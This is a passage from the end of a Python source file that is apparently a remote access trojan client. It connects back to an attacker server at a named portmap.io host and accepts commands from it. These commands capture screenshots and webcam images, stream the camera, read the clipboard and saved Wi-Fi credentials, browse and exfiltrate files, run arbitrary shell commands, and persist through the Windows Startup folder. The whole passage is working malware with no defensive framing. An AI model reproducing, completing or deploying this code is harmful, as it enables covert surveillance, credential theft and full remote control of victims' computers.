                print(f"[DEBUG] connect_to_server loop start: Attempting to set timeout to 60 seconds.")
                
                sock.settimeout(60) # This line is critical
                
                # ADD THIS LINE:
                print(f"[DEBUG] connect_to_server loop start: Timeout set to {sock.gettimeout()}. Now attempting to receive command.")

                command = sock.recv(1024).decode("utf-8")
                # ADD THIS LINE:
                print(f"[DEBUG] Received command: {command}")
                if not command:
                    print("[!] Connection closed by attacker.")
                    break # Exit the loop if the connection is closed
                if command.lower() == "exit":
                    sock.close()
                    break
                elif command.startswith("system_info"):
                    info = get_system_info()
                    sock.sendall(info.encode("utf-8"))
                elif command.lower() == "kill":
                    print("[*] Kill command received. Shutting down.")
                    killed = True
                    sock.close()
                    break
                elif command.lower() == "screenshot":
                    screenshot_data = capture_screenshot()
                    if screenshot_data:
                        # Send size first (16 bytes)
                        sock.sendall(f"{len(screenshot_data):016d}".encode("utf-8"))
                        sock.sendall(screenshot_data)
                    else:
                        sock.sendall(b"ERROR: Failed to capture screenshot.")
                elif command.startswith("face_recon"):
                    print("[DEBUG] connect_to_server: Calling handle_face_recon...")
                    handle_face_recon(command, sock)
                    print("[DEBUG] connect_to_server: handle_face_recon returned.")
                elif command.startswith("nmap_scan"):
                    nmap_args = command.split(" ", 1)[1] if len(command.split()) > 1 else ""
                    handle_nmap_scan(nmap_args, sock)
                elif command.lower() == "get_screenshot_frame":
                    try:
                        screenshot_data = capture_screenshot() # This calls the function from previous step
                        if screenshot_data:
                            # Pack the size of the image data into 4 bytes (unsigned long)
                            size_prefix = struct.pack("<L", len(screenshot_data))
                            sock.sendall(size_prefix + screenshot_data)
                        else:
                            sock.sendall(struct.pack("<L", 0) + b"ERROR: Failed to capture screenshot.")
                    except Exception as e:
                        sock.sendall(struct.pack("<L", 0) + f"ERROR: {e}".encode("utf-8"))
                elif command.lower().startswith("webcam_snap"):
                    try:
                        _, cam_index_str = command.split(maxsplit=1)
                        cam_index = int(cam_index_str)
                        photo_data, error_msg = capture_camera_photo(cam_index)
                        if photo_data:
                            # Send size first (16 bytes)
                            sock.sendall(f"{len(photo_data):016d}".encode("utf-8"))
                            sock.sendall(photo_data)
                        else:
                            sock.sendall(f"ERROR:{error_msg}".encode("utf-8"))
                    except ValueError:
                        sock.sendall(b"ERROR: Invalid camera index. Usage: webcam_snap <index>")
                    except Exception as e:
                        sock.sendall(f"ERROR: {e}".encode("utf-8"))
                elif command.lower().startswith("name "):  # Set target name
                    try:
                        new_name = command.split(" ", 1)[1].strip().strip('"')
                        if new_name == "--remove-name":  # Handle name removal
                            if remove_name_from_target():
                                sock.sendall(b"[+] Name removed successfully.\n")
                            else:
                                sock.sendall(b"[!] No name found to remove.\n")
                        else:
                            save_name_on_target(new_name)
                            sock.sendall(f"[+] Name saved: {new_name}\n".encode("utf-8"))
                    except:
                        sock.sendall(b"[!] Invalid name format\n")
                elif command.startswith("search_files"):
                    handle_search_files(command, sock)
                elif command == "get_clipboard":
                    handle_get_clipboard(sock)
                elif command.strip() == "popup_image":
                    handle_image_popup(sock)
                elif command.startswith("upload"):
                    try:
                        _, save_path = command.split(maxsplit=1)
                        # First send file size
                        file_size = os.path.getsize(save_path)
                        sock.sendall(f"{file_size:016d}".encode("utf-8"))  # 16-digit size header
                        
                        with open(save_path, "rb") as file:
                            while True:
                                chunk = file.read(65536)  # 64KB chunks
                                if not chunk:
                                    break
                                sock.sendall(chunk)
                        print("[+] File upload completed")
                    except Exception as e:
                        print(f"[!] Upload failed: {e}")
                elif command.strip().lower() == "get_saved_wifi":
                    get_saved_wifi(sock)
                elif command.strip().lower() == "list_cameras":
                    list_available_cameras(sock)
                elif command.startswith("per_file"):
                    try:
                        _, file_path = command.split(maxsplit=1)
                        startup_dir = os.path.expanduser(r"~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
                        destination = os.path.join(startup_dir, os.path.basename(file_path))
                        shutil.copy(file_path, destination)
                        sock.sendall(f"File persisted to {destination}".encode("utf-8"))
                    except Exception as e:
                        sock.sendall(f"Error persisting file: {e}".encode("utf-8"))
                elif command.startswith("popup "):
                    try:
                        parts = command.split("\"")
                        title = parts[1]
                        message = parts[3]
                        show_popup(title, message)
                        sock.sendall(b"[+] Popup displayed successfully.")
                    except Exception as e:
                        sock.sendall(f"[!] Failed to show popup: {e}".encode("utf-8"))
                elif command.startswith("list_dir"):
                    path_to_list = command.split(" ", 1)[1]
                    handle_list_dir(path_to_list, sock)
                elif command.startswith("view_file"):
                    file_to_view = command.split(" ", 1)[1]
                    handle_view_file(file_to_view, sock)
                elif command.startswith("stream_camera"):
                    print("[DEBUG] connect_to_server: Calling handle_stream_camera...")
                    command_args = command.split(" ", 1)[1] if len(command.split()) > 1 else ""
                    handle_stream_camera(command_args, sock)
                    print("[DEBUG] connect_to_server: handle_stream_camera returned.")
                elif command.startswith("download"):
                    try:
                        parts = command.split(maxsplit=1)
                        if len(parts) < 2:
                            raise ValueError("Invalid download command format.")
                        file_path = parts[1].strip().strip('"').replace("\\", "/")
                        
                        if not os.path.isfile(file_path):
                            sock.sendall(f"Error: File not found: {file_path}".encode("utf-8"))
                        else:
                            # Send file size first (16 bytes padded)
                            file_size = os.path.getsize(file_path)
                            sock.sendall(f"{file_size:016d}".encode("utf-8"))
                            
                            # Send file in chunks
                            with open(file_path, "rb") as file:
                                while True:
                                    chunk = file.read(65536)  # 64KB chunks
                                    if not chunk:
                                        break
                                    sock.sendall(chunk)
                    except Exception as e:
                        sock.sendall(f"Error: {e}".encode("utf-8"))
                elif command.startswith("upload"):
                    _, save_path = command.split(maxsplit=1)
                    try:
                        with open(save_path, "wb") as file:
                            while True:
                                data = sock.recv(4096)
                                if data.endswith(b"END_OF_FILE"):
                                    file.write(data[:-11])
                                    break
                                file.write(data)
                        sock.sendall(b"File uploaded successfully.")
                    except Exception as e:
                        sock.sendall(f"Error: {e}".encode("utf-8"))
                else:
                    # Call the updated handle_command function for general shell commands
                    # This function now handles sending the length-prefixed JSON response itself.
                    print(f"[DEBUG] connect_to_server: Calling handle_command for: {command}")
                    handle_command(command, sock)
                    print(f"[DEBUG] connect_to_server: handle_command returned for: {command}")
            except UnicodeDecodeError as ude:
                print(f"[!] Decoding Error: Could not decode received data as UTF-8. This might be binary data or protocol desynchronization. Error: {ude}")
                # Depending on your protocol, you might need to clear the buffer here
                # or try to resynchronize the connection. For now, it will just log and continue.
            except socket.timeout:
                print("[DEBUG] Socket timeout occurred. Continuing loop.")
                print("[!] No command received within timeout. Keeping connection alive.")
            except Exception as e:
                print(f"[DEBUG] An unexpected error occurred in the connect_to_server loop: {e}")
                print(f"[!] Error in command execution loop: {e}")
                break # Break loop on other errors to reconnect
    except Exception as e:
        # This outer except block handles connection errors and initial setup issues
        print(f"[!] Error during connection: {e}")
        time.sleep(5)
    finally:
        # This block ensures the socket is closed and reconnection is attempted
        if not killed:
            sock.close()
            time.sleep(10)
            connect_to_server(server_ip, server_port)



SERVER_IP = "whoiswho-20067.portmap.io"  
SERVER_PORT = 20067  
HEARTBEAT_INTERVAL_SECONDS = 15 # How often to check if attacker is online if target is online
RECONNECT_DELAY_SECONDS = 10 # Delay before retrying connection to attacker

while not killed:  
    print(f"[{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())}] Checking if target device has internet access...")
    if not is_target_online():
        print(f"[{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())}] [!] Target device is offline or has no internet connection. Retrying in 5 seconds...")
        time.sleep(5)  
        continue

    print(f"[{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())}] [*] Target device is online. Checking if attacker server is reachable...")
    
    # Try to connect to the attacker server
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5) # Set a timeout for the initial connection attempt
        sock.connect((SERVER_IP, SERVER_PORT))
        sock.close() # Close the test connection immediately if successful
        
        print(f"[{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())}] [*] Attacker server is ONLINE! Attempting full connection...")
        
        # If attacker is online, call the main connection function
        # The connect_to_server function now handles its own reconnection logic
        # if the connection drops *after* initial establishment.
        connect_to_server(SERVER_IP, SERVER_PORT)
        
    except socket.timeout:
        print(f"[{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())}] [!] Attacker server did not respond within 5 seconds. Assuming offline.")
        # Only send message if it's the first time we detect attacker offline
        if not hasattr(socket, 'last_offline_notification_time') or \
           (time.time() - socket.last_offline_notification_time) > 3600: # Send notification every hour
            send_message_proxy(MESSAGE)
            socket.last_offline_notification_time = time.time()
        print(f"[{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())}] [!] Attacker is NOT online... retrying in {RECONNECT_DELAY_SECONDS} seconds.")
        time.sleep(RECONNECT_DELAY_SECONDS)
        
    except (ConnectionRefusedError, socket.error) as conn_err:
        print(f"[{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())}] [!] Attacker server connection failed: {conn_err}. Retrying...")
        # Only send message if it's the first time we detect attacker offline
        if not hasattr(socket, 'last_offline_notification_time') or \
           (time.time() - socket.last_offline_notification_time) > 3600: # Send notification every hour
            send_message_proxy(MESSAGE)
            socket.last_offline_notification_time = time.time()
        print(f"[{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())}] [!] Attacker is NOT online... retrying in {RECONNECT_DELAY_SECONDS} seconds.")
        time.sleep(RECONNECT_DELAY_SECONDS)

    except Exception as e:
        print(f"[{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())}] [!] An unexpected error occurred in the main loop: {e}")
        # Consider more robust logging here, maybe to a file
        time.sleep(RECONNECT_DELAY_SECONDS)

print(f"[{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())}] [*] Target has been permanently KILLED. Exiting.")
